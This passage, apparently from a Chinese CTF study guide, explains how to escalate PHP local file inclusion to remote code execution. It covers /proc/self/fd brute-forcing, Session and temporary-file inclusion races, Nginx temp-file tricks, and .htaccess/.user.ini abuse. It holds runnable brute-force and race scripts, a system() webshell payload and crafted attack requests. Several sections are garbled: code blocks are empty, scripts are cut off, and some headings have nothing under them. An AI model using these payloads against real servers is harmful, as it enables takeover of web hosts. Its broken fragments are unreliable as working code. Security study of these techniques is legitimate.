| 适用场景 | 通用                       | Linux + PHP-FPM / Apache mod_php          |

> [!CAUTION]
>
> 注意：`/proc/self/environ` 在部分系统中权限为 `400`（仅 root 可读），若 Web 进程非 root 运行则无法读取。遇到这种情况直接换日志注入路径
>

## `/proc/self/fd`文件描述爆破

在这里插一句：与这个类似的还有一个短路径**` /dev/fd/N`**，关于使用可以参照一下GEEK2025的`Vibe SEO`

**原理**

Linux 中**每个进程**打开的**文件**都会在 `/proc/self/fd/` 下生成一个**符号链接**，链接到**实际文件路径**

```
/proc/self/fd/0  → /dev/pts/0（stdin）
/proc/self/fd/1  → /dev/pts/0（stdout）
/proc/self/fd/2  → /dev/pts/0（stderr）
/proc/self/fd/3  → /var/log/apache2/access.log
/proc/self/fd/4  → /tmp/phpXXXXXX（上传临时文件）
/proc/self/fd/5  → /tmp/sess_abc123（Session 文件）
...
```

好处：不需要知道文件的绝对路径，只需爆破 fd 编号，就能间接包含任意已打开文件

- **利用场景一：绕过路径未知问题**

当确定想要的文件存在，而我们不知道这个文件在哪里，路径是什么的时候

```
?file=/proc/self/fd/3
?file=/proc/self/fd/4
?file=/proc/self/fd/5
...
?file=/proc/self/fd/100
```

用 Burp Intruder 爆破 fd 编号（通常在 0~100 范围内），直到包含到目标文件内容

- **利用场景二：临时文件竞争的稳定化**

PHP 处理文件上传时，临时文件 `/tmp/phpXXXXXX` 存在于内存中，fd 编号固定（通常是 fd/4 或 fd/5）

```
# 上传含 PHP 代码的文件，同时爆破 fd：
?file=/proc/self/fd/4&cmd=id
```

这比猜 `/tmp/phpXXXXXX` 的随机文件名稳定得多，是临时文件竞争的核心技术支撑

爆破脚本

```python
import requests

url = "http://victim.com/index.php"
for i in range(0, 100):
    r = requests.get(url, params={
        "file": f"/proc/self/fd/{i}",
        "cmd": "id"
    })
    if "www-data" in r.text or "uid=" in r.text:
        print(f"[+] Hit! fd/{i}")
        print(r.text[:500])
        break
    elif len(r.text) > 100:  # 有内容但不是命令输出，可能是文件内容
        print(f"[?] fd/{i} has content ({len(r.text)} bytes)")
```

## `/proc/self/cmdline`信息收集

**原理**

​	`/proc/self/cmdline` 存储当前进程的启动命令行，内容以 `\0` 分隔

```
/usr/sbin/apache2\0-k\0start\0
# 或
php-fpm: pool www\0
```

**对LFI的价值**

对于GetShell有极大的帮助

| 信息                                     | 用途                    |
| ---------------------------------------- | ----------------------- |
| Web 服务类型（Apache / Nginx / php-fpm） | 确定日志路径            |
| PHP 版本（`php7.4-fpm`）                 | 判断 `%00` 截断是否有效 |
| 工作目录（`-c /etc/php/7.4/fpm/`）       | 定位配置文件路径        |
| 用户身份（`www-data` / `root`）          | 判断权限范围            |

**读取方式**

```
?file=/proc/self/cmdline
```

输出含 `\0` 分隔符，浏览器可能显示乱码，建议配合 `php://filter/convert.base64-encode` 读取后 base64 解码

```
?file=php://filter/convert.base64-encode/resource=/proc/self/cmdline
```

## 其它`/proc`节点

| 路径                 | 内容                          | 用途               |
| -------------------- | ----------------------------- | ------------------ |
| `/proc/self/maps`    | 内存映射（含加载的 .so 路径） | 定位库文件路径     |
| `/proc/self/status`  | 进程状态（PID、UID、GID）     | 确认权限           |
| `/proc/version`      | 内核版本                      | 判断内核漏洞可用性 |
| `/proc/net/tcp`      | 网络连接状态                  | 内网探测           |
| `/proc/net/fib_trie` | 路由表（含内网 IP）           | 内网信息收集       |

- **environ GetShell**

```

```

# Getshell(2)Session文件包含

> [!CAUTION]
>
> **核心逻辑**：
> PHP 的 Session 数据默认以**文件形式**存储在**服务器本地**（`/tmp/sess_PHPSESSID`），若应用<u>将用户可控数据写入 Session</u>，再配合 LFI 包含该 Session 文件，即可触发 RCE

## 7.1 Session文件基础

- **PHP Session存储机制**

PHP 默认将 Session 序列化后写入文件，**路径规则:**

```
/tmp/sess_{PHPSESSID 的值}
```

例如 Cookie 中 `PHPSESSID=abc123`，对应文件为：

````
/tmp/sess_abc123
````

**文件内容格式**（默认 `php` 序列化格式）：

```
username|s:5:"admin";role|s:4:"user";
```

若用户可控 `username` 字段，写入 PHP 代码：

```
username|s:32:"<?php system($_GET['cmd']); ?>";
```

包含该文件时，PHP 解析到 `<?php ... ?>` 直接执行

- **Session文件路径确认**

| 配置项              | 默认值                   | 说明               |
| ------------------- | ------------------------ | ------------------ |
| `session.save_path` | `/tmp`                   | 最常见             |
| `session.save_path` | `/var/lib/php/sessions`  | Debian/Ubuntu 常见 |
| `session.save_path` | `/var/lib/php5/sessions` | 老版本 Debian      |

读取配置确认路径：

```
?file=/etc/php/7.4/fpm/php.ini
# 搜索 session.save_path
```

或直接爆破

```
?file=/tmp/sess_abc123
?file=/var/lib/php/sessions/sess_abc123
?file=/var/lib/php5/sessions/sess_abc123
```

## 7.2 Session写马两步法

**前提条件**

```
1. 应用存在将用户输入写入 Session 的逻辑
2. LFI 漏洞存在（可包含任意文件）
3. 知道或能猜到 PHPSESSID 的值
4. Session 文件可读（Web 进程有读权限）
```

- **将PHP代码写入Session (典型漏洞代码)**

找到应用中写入 Session 的功能点（登录、搜索、语言切换等）：

```php
// 典型漏洞代码
session_start();
$_SESSION['username'] = $_GET['username'];  // 用户输入直接写入 Session
```

构造请求，将PHP代码作为参数值传入：

```http
GET /index.php?username=<?php system($_GET['cmd']); ?> HTTP/1.1
Cookie: PHPSESSID=abc123
```

此时 `/tmp/sess_abc123` 内容变为

```
username|s:32:"<?php system($_GET['cmd']); ?>";
```

- **LFI包含Session文件触发执行**

```http
GET /index.php?file=/tmp/sess_abc123&cmd=id HTTP/1.1
Cookie: PHPSESSID=abc123
```

→ PHP 包含 Session 文件，解析执行其中的 PHP 代码，返回 `uid=33(www-data)`

> [!CAUTION]
>
> 两步请求必须携带同一个 `PHPSESSID`，否则包含的是不同的 Session 文件

## 7.3 Session序列化格式

PHP 支持三种 Session 序列化格式，格式不一致时会产生额外的注入面

| 格式          | 配置值                                    | 示例内容                       |
| ------------- | ----------------------------------------- | ------------------------------ |
| php（默认）   | `session.serialize_handler=php`           | `key|s:5:"value";`             |
| php_serialize | `session.serialize_handler=php_serialize` | `a:1:{s:3:"key";s:5:"value";}` |
| php_binary    | `session.serialize_handler=php_binary`    | `\x03keys:5:"value";`          |

第二种序列化以及反序列化我在php一系列中进行了详细讲解

**格式混用漏洞**

当写入 Session 用 `php_serialize` 格式，读取用 `php` 格式时，可构造特殊 payload 注入任意键值

```
写入（php_serialize）：
a:1:{s:8:"username";s:32:"|<?php system($_GET['cmd']); ?>";}

读取（php 格式解析）：
php 格式以 | 作为键值分隔符
→ 键名：a:1:{s:8:"username";s:32:"
→ 键值：<?php system($_GET['cmd']); ?>";}
→ 键值部分被当作 PHP 代码执行！
```

payload构造

```
?username=|<?php system($_GET['cmd']); ?>
```

这个漏洞的**本质**是：`|` 在 `php_serialize` 格式中是普通字符，但在 `php` 格式中是分隔符，格式混用导致解析错位。

## 7.4 PHPSESSID的获取与控制

- **方法一：从响应头获取**

正常访问应用，响应头中会有：

```http
Set-Cookie: PHPSESSID=abc123; path=/
```

### 7.5.1 session.upload.enabled

```ini

**作用**：PHP5.4+新增特性，用于监控文件上传进度

**关键特性：**

- **即使没有 Session 写入逻辑，也能通过上传触发 Session 文件创建**

```

**作用**：指定触发上传进度记录的POST参数名

**利用方式：**

```ini

**作用：**上传完成后立即清除进度信息

**安全影响：**

- 开启时，Session 文件中的上传进度数据会在请求结束时被删除
- **必须通过条件竞争在删除前包含 Session 文件**

### 7.5.4 session.use_strict_mode

**作用：**是否严格校验客户端传入的PHPSESSID

**利用价值：**

此时 Session 文件路径固定为 `/tmp/sess_hacker`，无需猜测

```http

```

**作用：** 是否自动初始化 Session（无需 `session_start()`）。

**与 upload_progress 的关系：**

### 7.6.1 原理：上传进度监控机制

**关键点：**

**此时 Session 文件内容：**

- **多线程竞争包含 Session 文件**

import io
import requests
import threading

sessid = 'hacker'
url = 'http://target.com/index.php'
flag_found = False

def write_session(session):
    """持续上传，写入 PHP 代码到 Session"""
    while not flag_found:

        )

def read_session(session):
    """竞争包含 Session 文件"""
    global flag_found
    while not flag_found:
        r = session.post(
            url,
            data={'file': f'/tmp/sess_{sessid}'},
            params={'cmd': 'cat /flag'},

        )
        
        if 'flag{' in r.text:

            break

if __name__ == "__main__":
    event = threading.Event()
    
    with requests.session() as session:
        # 30 个写入线程
        for _ in range(30):
            threading.Thread(target=write_session, args=(session,)).start()
        
        # 30 个读取线程

## 7.7 Session Base64 编码绕过

### 7.7.1 场景

- **漏洞代码**

```php
// session.php
session_start();
$username = $_POST['username'];
$_SESSION['username'] = base64_encode($username);  // 编码后存储
```

- **正常写入webshell**

```http
# 正常写入
POST /session.php HTTP/1.1

username=<?php system($_GET['cmd']); ?>
```

- **Session文件内容**

```
username|s:44:"PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=";
```

- **包含session文件**

```
?file=/tmp/sess_abc123
```

**结果：**输出Base64字符串，无法执行

### 7.7.2 `php://filter`解码绕过

- **payload**

```
?file=php://filter/read=convert.base64-decode/resource=/tmp/sess_abc123
```

**问题：**Base64解码失败

- **原因分析**

Session文件内容:

```
username|s:44:"PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=";
```

**Base64解码要求字符串长度是 4 的倍数**，但是`username|s:44"`这部分**不是有效Base64**

### 7.7.3 Payload构造技巧

- **方法一：填充无效字符串**

Base64解码会忽略非Base64字符（`a-z A-Z 0-9`之外的字符）

```
username|s:44:"  -> 被忽略
PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
"; -> 被忽略
```

但实际测试也就是上面问题分析中可以发现：PHP的 Base64 解码器会尝试解码整个字符串，导致解码失败

- **方法二：构造特殊Payload**

让Session文件内容本身就是有效的Base64

```php
// 构造 Payload
$payload = base64_encode('<?php system($_GET["cmd"]); ?>');

// 填充到 4 的倍数
$payload = str_pad($payload, ceil(strlen($payload)/4)*4, 'A');
```

- **方法三：利用`convert.iconv`过滤器**

```
?file=php://filter/convert.iconv.UTF-8.UTF-7/resource=/tmp/sess_abc123
```

通过字符集转换绕过编码限制

# Getshell(3)临时文件包含

> [!CAUTION]
>
> 核心逻辑：
> PHP 处理文件上传时，会将文件临时存储在 `/tmp/phpXXXXXX`，处理完成后立即删除。若能在删除前通过 LFI 包含该临时文件，即可触发 RCE。这个"删除前"的时间窗口就是竞争的核心。

> 这个其实跟文件上传漏洞的条件竞争比较像，那个是一边不断发包，一边不断访问，达到有一瞬间文件未被删除就执行的效果。这个是一边不断发起文件上传，一边通过LFI去爆破包含 `/tmp` 目录下的临时文件名，达到在PHP处理完上传，删除临时文件前的极短时间内成功包含并执行恶意代码的效果。

## 8.1 临时文件机制

- **PHP文件上传的生命周期**

```
客户端上传文件
      ↓
PHP 将文件写入 /tmp/phpXXXXXX（随机6位字母数字）
      ↓
执行 $_FILES 相关逻辑（move_uploaded_file 等）
      ↓
请求结束 → PHP 自动删除临时文件
```

**关键点**：

	1. 临时文件在整个请求生命周期内都存在
	1. 文件名完全随机（`/tmp/phpAb3xYz`），无法预测
	1. 文件内容就是上传的原始内容，不做任何过滤

- **为何可以Getshell**

```php
// 上传含 PHP 代码的文件
// 临时文件内容：<?php system($_GET['cmd']); ?>
// 路径：/tmp/phpAb3xYz

// 同时触发 LFI：
?file=/tmp/phpAb3xYz&cmd=id
// → PHP 包含临时文件 → 执行代码 → RCE
```

知道了为何以及如何Getshell之后，思路通了，但有一个问题就是：文件名随机，那在做题或其他情况下怎么知道文件名再去触发LFI，文件名都不知道，那是无法LFI的，这时候，为了解决这个问题，**phpinfo()**的重要性就体现出来了

## 8.2 phpinfo()泄露临时文件路径

### 8.2.1phpinfo()中的关键信息

当 PHP 处理上传请求时，若同时访问 `phpinfo()`，响应中会包含：

```
_FILES["file"]["tmp_name"]  /tmp/phpAb3xYz
```

phpinfo() 在请求处理期间**输出所有超全局变量**，包括 `$_FILES`，而此时临时文件还未被删除。

### 8.2.2经典利用组合

```
条件：
1. 存在 phpinfo() 页面（或任意能输出 $_FILES 的页面）
2. 存在 LFI 漏洞
3. 两个功能在同一个 PHP 进程中（同一服务器）
```

**利用流程**

```
Step 1：构造一个同时上传文件 + 访问 phpinfo() 的请求
         → 从 phpinfo() 响应中提取 tmp_name
Step 2：在临时文件被删除前，用 LFI 包含该路径
         → 触发 RCE
```

> [!IMPORTANT]
>
> 时间窗口极短（毫秒级），单线程无法完成，必须多线程竞争

## 8.3 竞争窗口利用

**竞争原理**：

```
线程A（上传 + 读 phpinfo）：
  发送上传请求 → 解析 phpinfo 响应 → 提取 tmp_name → 通知线程B

线程B（LFI 包含）：
  收到 tmp_name → 立即发送 LFI 请求 → 包含临时文件

竞争窗口：tmp_name 提取完成 到 临时文件被删除 之间的时间
```

**扩大竞争窗口的技巧**

phpinfo() 响应越大，PHP 处理时间越长，临时文件存活时间越长

**技巧**：发送超大请求体撑大 phpinfo() 的输出缓冲

```python
# 构造超大 boundary，让 phpinfo() 输出更多内容，延长处理时间
payload = "A" * 1024 * 100  # 100KB 填充数据
```

或者利用 PHP 的输出缓冲机制：phpinfo() 默认分块输出，第一个 chunk 返回时临时文件已存在，此时 tmp_name 已可读取。

**竞争窗口延长的底层逻辑**（为什么填充垃圾数据有效）

```
PHP默认输出缓冲区大小为4096 字节
每次向 socket 连接返回 4096 字节（chunked 分块传输）

因此：phpinfo 页面越大 → 需要的chunk 数越多 → 第一个请求的 socket 存活越久
  只要第一个请求的 socket 连接未关闭 → PHP 不会删除临时文件

关键操作：
  直接操作原生 socket，每次只读 4096 字节
  一旦读到包含 tmp_name 的chunk，立即发起 LFI 请求
  此时第一个请求还在持续传输剩余 chunk → 临时文件仍然存在
```

> 这也是为什么原版脚本使用**原生 socket** 而不是 requests 库——requests会等待整个响应结束，无法实现"边读边打"。

## 8.5 `/proc/self/fd/`稳定化方案(附脚本)

竞争方案依赖时间窗口，不够稳定。结合第前面`/proc伪文件系统利用` 的 `/proc/self/fd/`，可以完全消除随机性。

**原理**

PHP 上传文件时，临时文件会被 PHP 进程打开，对应一个 fd 编号。通过 LFI 包含 `/proc/self/fd/N`，可以直接引用该文件描述符，**不需要知道 `/tmp/phpXXXXXX` 的具体路径**。

**利用流程**

```
Step 1：上传含 PHP 代码的文件（保持连接不断开，延长临时文件存活）
Step 2：爆破 /proc/self/fd/[0-100]
Step 3：命中临时文件的 fd → 直接执行
```

**爆破脚本**

```python
import requests
import threading

TARGET = "http://victim.com"
payload = b"<?php system($_GET['cmd']); ?>"

# 上传线程：保持长连接，让临时文件存活更久
def keep_upload():
    files = {"file": ("a.jpg", payload * 1000, "image/jpeg")}  # 大文件延长处理时间
    requests.post(TARGET + "/upload.php", files=files, timeout=30)

# fd 爆破线程
def brute_fd():
    for i in range(0, 100):
        r = requests.get(TARGET + "/index.php", params={
            "file": f"/proc/self/fd/{i}",
            "cmd": "id"
        }, timeout=3)
        if "uid=" in r.text:
            print(f"[+] Hit fd/{i}!")
            print(r.text[:200])
            return
        elif "<?php" in r.text:
            print(f"[?] fd/{i} contains PHP code but not executed")

t2 = threading.Thread(target=brute_fd)

t2.start()

```

**与竞争方案的区别**

| 对比项     | phpinfo() 竞争       | /proc/self/fd/ 爆破  |
| ---------- | -------------------- | -------------------- |

| 稳定性     | 依赖时间窗口，不稳定 | 稳定，无时间限制     |

| 适用场景   | 有 phpinfo() 的题目  | 通用，优先尝试       |

> [!CAUTION]
>
> 优先尝试 `/proc/self/fd/` 爆破，没有上传功能或 fd 爆破失败再考虑 phpinfo() 竞争

# Getshell(4)Nginx文件包含

## 9.1 Nginx两种临时文件机制(原理)

Nginx在处理请求时，有两个独立的缓冲机制会产生临时文件

### 9.1.1 请求体缓冲Client Body Buffering

**触发条件：**

```nginx
# 当POST请求体大小超过此值时，Nginx会将body写入临时文件
client_body_buffer_size 8k;    # 默认8KB或16KB（取决于平台）
```

**临时文件特征：**

```bash
路径格式：/var/lib/nginx/body/0000001368
文件内容：原始POST body数据（包括multipart boundary等）
生命周期：请求处理完毕后立即删除（unlink）
权限：    www-data:www-data 0600
```

**关键配置项：**

```nginx
client_body_temp_path /var/lib/nginx/body;  # 临时文件目录
client_max_body_size 10m;                    # 最大body大小
```

### 9.1.2 响应缓冲(Fastcgi Response Buffering)

**触发条件**

```nginx
# 当PHP-FPM返回的响应超过缓冲区大小时，Nginx会将响应写入临时文件
fastcgi_buffers 8 4k;          # 默认8个4KB缓冲区 = 32KB
fastcgi_buffer_size 4k;        # 第一个响应缓冲区大小
```

**临时文件特征**

```bash
路径格式：/var/lib/nginx/fastcgi/3/45/0000000453
文件内容：PHP输出内容的一部分（可能包含HTTP响应头）
生命周期：响应传输完毕后立即删除
权限：    www-data:www-data 0600
```

**关键配置项**

```nginx
fastcgi_temp_path /var/lib/nginx/fastcgi 1 2;  # 临时文件目录（1 2表示两级子目录）
fastcgi_max_temp_file_size 1024m;               # 临时文件最大大小
```

## 9.2 适用场景

极端防御环境下依然可用的LFI利用方式

**必要条件**

- 存在LFI漏洞（include/require）
- Nginx + PHP-FPM架构
- Nginx与PHP-FPM以相同用户运行（通常是www-data）

**典型防御场景**

- PHP所有临时目录被禁写(`/tmp`,`/var/tmp`,`/var/lib/php/sessions`权限设置为`000`)

## 9.3 核心难点（文件立即被删）

### 9.3.1 Nginx源码分析(ngx_open_tempfile)

```c
// src/core/ngx_file.c
ngx_fd_t
ngx_open_tempfile(u_char *name, ngx_uint_t persistent, ngx_uint_t access)
{
    ngx_fd_t  fd;

    // 创建临时文件
    fd = open((const char *) name, O_CREAT|O_EXCL|O_RDWR,
              access ? access : 0600);

    // 关键：如果不是持久化文件，立即unlink删除
    if (fd != -1 && !persistent) {
        (void) unlink((const char *) name);  // ← 文件被删除
    }

    return fd;  // 但文件描述符仍然有效！
}
```

**问题**

- 文件创建后立即被`unlink()`删除
- 在文件系统中用`ls`看不到文件
- 但Nginx进程仍然持有`打开的文件描述符`(fd)

### 9.3.2 利用`proc/PID/fd`绕过

Linux特性

```bash
# 即使文件被unlink，只要进程还持有fd，就可以通过/proc访问
/proc/34/fd/15 -> /var/lib/nginx/body/0000001368 (deleted)
```

但是PHP的include有个问题

```php
// 直接包含会失败，因为PHP会resolve路径
include('/proc/34/fd/15');  
// ↓ PHP内部会readlink解析为：
// /var/lib/nginx/body/0000001368 (deleted)
// ↓ 然后stat检查文件是否存在 → 失败（文件已被删除）
```

**绕过方法**：使用相对路径混淆

```php
// 使用相对路径绕过PHP的路径解析
include('/proc/self/fd/34/../../../34/fd/15');
// ↓ PHP解析路径时：
// /proc/self/fd/34 → 指向当前PHP进程的fd 34（可能是其他文件）
// /../../../34/fd/15 → 回退后进入Nginx worker进程34的fd 15
// ↓ 最终访问到Nginx的临时文件，且绕过了stat检查
```

## 9.5 利用方法二：Fastcgi Response竞争

### 9.5.1 攻击流程

```
① 构造超大PHP响应（>32KB）触发Nginx响应缓冲
② 触发时快速爆破临时文件路径 /var/lib/nginx/fastcgi/*/*/0000000XY
③ 或使用 inotify监控文件创建事件
④ 成功包含后执行webshell
```

与 Client Body方式对比

| 项目     | Client Body方式                             | Fastcgi Response方式               |
| -------- | ------------------------------------------- | ---------------------------------- |
| 触发条件 | `POST body > client_body_buffer_size (8KB)` | `PHP响应 > fastcgi_buffers (32KB)` |
| 文件内容 | POST原始数据                                | PHP输出内容（含HTTP头）            |
| 稳定性   | ⭐⭐⭐⭐（fd爆破范围小）                        | ⭐⭐（文件名需预测）                 |
| 调试难度 | 低                                          | 高（需理解文件名生成逻辑）         |

### 9.5.2 Nginx临时文件命名规律

Nginx的fastcgi临时文件名采用**递增编号 + 两级子目录**设计：

```bash
/var/lib/nginx/fastcgi/3/45/0000000453
```

结构解析

```
3：一级目录，取自 fastcgi_temp_path /var/lib/nginx/fastcgi 1 2 的第1级（1表示1位）

45：二级目录，取自上述配置的第2级（2表示2位）

0000000453：8位数字文件名，递增生成
```

文件名生成逻辑(源码级)

```c
// ngx_create_temp_file 函数
ngx_string_t  name = {0};
ngx_snprintf(name.data, name.len, "%08uL", file->number);
// file->number 从1开始递增，全局计数器
```

即：文件名 = `0000000X`（X为从1开始的计数器值）

**文件名预测**

- 暴力爆破

```python
# 尝试当前已知编号附近的文件
base_path = '/var/lib/nginx/fastcgi'
for level1 in range(0, 10):         # 0-9
    for level2 in range(0, 100):    # 00-99
        for num in range(start, start+1000):  # 从某编号开始
            path = f'{base_path}/{level1}/{level2:02d}/0000000{num}'
            r = requests.get(url, params={'file': path})
            if '<?php' in r.text:
                print(f'[+] Found: {path}')
                return
```

- 监控+预测

```bash
# 使用 inotifywait 监控临时目录创建事件
inotifywait -m /var/lib/nginx/fastcgi -e CREATE |
while read path action file; do
    echo "[$(date)] $action $file"
    # 提取文件名中编号
    num=$(echo $file | grep -oE '[0-9]{8}' | head -1)
    echo "[+] New temp file number: $num"
    # 立即构造包含路径
    payload="/var/lib/nginx/fastcgi/$path/$file"
    # 用其他线程立即include此路径
done
```

关键：文件创建和删除都在**毫秒级内**，必须用监控或极高并发

### 9.5.3 调试技巧：`chattr + a`禁止删除

当需要**保留临时文件用于分析**时，可利用`chattr`命令临时锁定目录

```bash
# 1. 预测下一个临时文件会创建在哪个子目录
# 通常为 /var/lib/nginx/fastcgi/3/45/（通过前几次请求观察规律）

# 2. 对目录添加"追加"属性（文件可写入，但不能被unlink）
sudo chattr +a /var/lib/nginx/fastcgi/3/45/

# 3. 触发PHP输出超大响应
curl -X POST http://target/lfi.php -d '<?php echo str_repeat("A", 100000);'

# 4. 此时临时文件会被创建但**无法被Nginx删除**
ls -la /var/lib/nginx/fastcgi/3/45/
# -rw------- 1 www-data www-data 32768 Dec 25 23:58 0000000453   ← 文件存在！

# 5. 查看文件内容（可能包含HTTP响应头+PHP输出）
cat /var/lib/nginx/fastcgi/3/45/0000000453
```

原理：

- `chattr +a`：设置文件为追加模式，**禁止删除**（unlink失败）
- Nginx调用`unlink()`时，系统返回`EPERM`，但**不中断请求处理**
- 临时文件被保留，可用于分析内容格式

> [!CAUTION]
>
> 需要root权限

### 9.7.1 题目分析

# 服务器配置文件利用

## 10.1 .htaccess基础

> 关于.htaccess的知识在文件上传漏洞中已经提到过一种用法【上传后，可使指定后缀的文件当作php文件执行】，这里讲讲在LFI中的用法

`.htaccess` 是 Apache 的**目录级配置文件**，允许在不修改主配置的情况下覆盖特定目录的行为。

**生效前提：**

- Web 服务器必须是 **Apache**
- `httpd.conf` 中对应目录设置了 `AllowOverride All`（或至少 `AllowOverride Options FileInfo`）
- `.htaccess` 文件放在哪个目录，就对那个目录生效

```apache
# httpd.conf 中的前提配置
<Directory /var/www/html>
    AllowOverride All   # 允许 .htaccess 覆盖配置
</Directory>
```

**常见可用指令**

| 指令                          | 作用                                                        |
| ----------------------------- | ----------------------------------------------------------- |
| `AddType`                     | 将指定后缀映射为某种 MIME 类型（可让 `.jpg` 被当 PHP 解析） |
| `php_value auto_prepend_file` | 每次 PHP 请求**前**自动包含指定文件                         |
| `php_value auto_append_file`  | 每次 PHP 请求**后**自动包含指定文件                         |
| `Options +ExecCGI`            | 允许 CGI 执行                                               |
| `SetHandler`                  | 强制指定文件处理器                                          |

## 10.2 .htaccess配合LFI Getshell

**核心思路**

上传限制通常只检查后缀或 MIME，但如果能上传 `.htaccess`，就能**重新定义解析规则**，让后续上传的图片马被当 PHP 执行

### **AddType 指令利用**

```apache
# 上传这个 .htaccess
AddType application/x-httpd-php .jpg
```

这个指令upload已经说过，再提一次

**完整利用链条**

```
Step 1：上传 .htaccess，内容如上
         → 目录下 .jpg 文件现在会被当 PHP 执行

Step 2：上传图片马 shell.jpg
         内容：<?php system($_GET['cmd']); ?>

Step 3：直接访问 shell.jpg（不需要 LFI）
         GET /uploads/shell.jpg?cmd=id
         → Apache 按 .htaccess 规则交给 PHP 解析 → RCE

Step 4（若只有 LFI 无直接访问）：
         ?file=/var/www/html/uploads/shell.jpg
         → PHP include 包含 → 同样执行
```

注意：Step 3 直接访问就能 RCE，LFI 反而是备用路径。这个组合在**文件上传题**中比 LFI 题更常见

### **SetHandler替代方案**

```apache
# 效果等同于 AddType，但更强制
<FilesMatch "\.jpg$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

或者更暴力，让目录下所有文件都走 PHP：

```apache
SetHandler application/x-httpd-php
```

## 10.3 .htaccess直接写马

不需要二次上传图片马，`.htaccess` 本身就携带 PHP 代码

### php_value auto_prepend_file

```apache
# .htaccess 内容
php_value auto_prepend_file "/var/www/html/uploads/shell.jpg"
```

效果：访问该目录下**任意 PHP 文件**时，都会在执行前自动 `include` 指定文件。

**利用链：**

```txt
上传 .htaccess（设置 auto_prepend_file 指向图片马）

上传 shell.jpg（内容为 PHP 代码）

访问目录下任意 .php 文件 → 自动包含 shell.jpg → RCE
```

### **.htaccess 本身包含 PHP 代码**

```apache
# .htaccess 内容
AddType application/x-httpd-php .htaccess
# <?php system($_GET['cmd']); ?>
```

然后LFI包含.htaccess本身:

```
?file=/var/www/html/uploads/.htaccess&cmd=id
```

PHP包含该文件时，`#`是PHP注释，`AddType`那行是普通文本被忽略，只有`<?php ... ?>`被执行

> 这个用法的好处是：一个文件即可解决问题，满足了Apache配置语法和PHP代码语法

## 10.4 其他配置文件利用

### nginx.conf / sites-enabled 信息泄露

nginx不支持.htaccess，但是配置文件本身有利用价值

```
# 通过 LFI 读取 Nginx 配置，获取：
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/default
/usr/local/nginx/conf/nginx.conf
```

能从中获取：

- Web 根目录的真实路径（`root` 指令）
- 其他虚拟主机配置
- PHP-FPM socket 路径（为后续 FastCGI 攻击做准备）

```nginx
# 从配置中读到的关键信息示例
server {
    root /var/www/html;          # Web 根目录
    fastcgi_pass unix:/run/php/php7.4-fpm.sock;  # FPM socket
}
```

### user.ini（PHP-FPM 场景的核心）

`.htaccess` 只在 **Apache** 下生效，**Nginx + PHP-FPM** 环境用 `user.ini` 替代

**原理**：PHP-FPM 会在每个目录下查找 `.user.ini`，其中可设置 PHP 配置项，效果等同于 `php.ini`。

```ini
; .user.ini 内容
auto_prepend_file = shell.jpg
```

**效果**：访问该目录下任意 `.php` 文件，都会自动 `include shell.jpg`

> [!CAUTION]
>
> - `.user.ini` 有缓存，默认 300 秒（`user_ini.cache_ttl`）才重新读取，上传后可能需要等待
> - 只对 PHP-FPM 处理的请求生效，CLI 模式无效
> - 文件名是 `.user.ini`，不是 `user.ini`

### php.ini 中 auto_prepend_file

全局 `php.ini` 中同样支持此指令，但通常无写权限，了解即可

```
; /etc/php/7.4/fpm/php.ini
auto_prepend_file = /var/www/html/shell.php
```

## 10.5 典型场景与识别特征

### 识别 .htaccess 可利用的特征

```
✓ 文件上传功能存在
✓ 上传目录在 Web 根目录下（可访问）
✓ 服务器是 Apache（响应头 Server: Apache）
✓ 上传限制只检查后缀黑名单（.php 被拦，但 .htaccess 未被拦）
✓ 或者：有 LFI + 上传功能组合
```

### 识别 user.ini 可利用的特征

```
✓ 服务器是 Nginx（响应头 Server: nginx）
✓ 有文件上传功能
✓ 上传目录下存在 .php 文件可访问（index.php 等）
✓ 上传限制未过滤 .user.ini
```

### .htaccess 与 user.ini 对比

| 对比项       | .htaccess      | .user.ini          |
| ------------ | -------------- | ------------------ |
| 适用服务器   | Apache         | Nginx + PHP-FPM    |
| 生效速度     | 立即           | 最多等 300s        |
| 需要二次上传 | 视利用方式而定 | 通常需要上传图片马 |
| 文件名       | `.htaccess`    | `.user.ini`        |
| CTF 出现频率 | 中             | 高                 |

### 组合利用链总结

```
Apache 环境：
  上传 .htaccess（AddType .jpg → PHP）
  + 上传 shell.jpg
  → 直接访问 shell.jpg → RCE

Nginx 环境：
  上传 .user.ini（auto_prepend_file = shell.jpg）
  + 上传 shell.jpg
  → 访问同目录任意 .php → RCE

有 LFI 无直接访问：
  上传任意文件（内容为 PHP 代码）
  + .htaccess 或 .user.ini 改变解析
  → LFI 包含该文件 → RCE

.htaccess 自包含（最简链路）：
  上传 .htaccess（自身含 PHP 代码 + AddType 自身）
  → LFI 包含 .htaccess → RCE
```
